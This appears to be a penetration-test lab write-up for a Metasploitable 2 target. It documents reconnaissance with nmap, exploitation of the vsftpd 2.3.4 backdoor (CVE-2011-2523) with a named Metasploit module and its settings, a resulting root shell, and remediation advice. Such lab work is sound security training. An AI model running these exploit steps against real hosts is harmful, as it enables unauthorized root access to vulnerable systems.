# üìÇ VSFTPD 2.3.4 Backdoor Exploitation (Metasploitable 2)

### üìå Executive Summary

A critical-severity vulnerability ($\text{CVE-2011-2523}$) was identified in the `vsftpd` service running on port 21 of the target host ($\text{192.168.56.101}$, Metasploitable 2).

This service contains an intentional backdoor that was easily exploited by an unauthenticated attacker. The compromise resulted in the attacker gaining a **root-level reverse shell**, leading to full command execution and complete system control.

**Finding Severity: CRITICAL**

---

### üî¨ Technical Details and Methodology

The engagement followed a standard Red Team methodology: Reconnaissance, Vulneration Analysis, Exploitation, and Post-Exploitation.

#### 1. Reconnaissance (Nmap)

The initial scan confirmed that the target was running an outdated and highly vulnerable service version.

* **Target IP:** `192.168.56.101`
* **Command:** `nmap -sV -A 192.168.56.101`
* **Key Output:**
    ```text
    PORT     STATE SERVICE VERSION
    21/tcp   open  ftp     vsftpd 2.3.4
    ```

#### 2. Vulnerability Analysis

The detected version, `vsftpd 2.3.4`, is publicly known to contain a malicious backdoor ($\text{CVE-2011-2523}$). This vulnerability can be exploited without any credentials by using the Metasploit Framework.

#### 3. Exploitation (Proof of Concept)

The `vsftpd_234_backdoor` module was used within Metasploit to exploit the vulnerability and deliver a command shell payload.

* **Attacker IP (LHOST):** `192.168.56.102`
* **Module Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
* **Metasploit Commands:**
    ```ruby
    msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
    msf6 exploit(...) > set RHOSTS 192.168.56.101
    msf6 exploit(...) > run
    ```

#### 4. Post-Exploitation

Successful exploitation yielded a root-level shell on the Metasploitable 2 host.

* **Resulting Shell Command:** `whoami`
* **Resulting Output:** `root`

![whoami command output](../Images/whoami.png)

---

### üõ°Ô∏è Remediation and Mitigation

To fully mitigate this critical vulnerability, the following actions are necessary:

1.  **Immediate Patching/Upgrade:** The `vsftpd 2.3.4` service must be immediately upgraded to a patched, stable version (e.g., $\text{vsftpd 3.0.0}$ or later) or decommissioned entirely.
2.  **Network Segmentation:** Implement a restrictive firewall rule to limit incoming FTP traffic (Port 21) to only necessary, authorized network segments, reducing the attack surface.
3.  **Vulnerability Scanning:** Implement scheduled vulnerability scanning (e.g., using $\text{OpenVAS}$ or $\text{Nessus}$) to continuously monitor all services for known, unpatched software versions.

---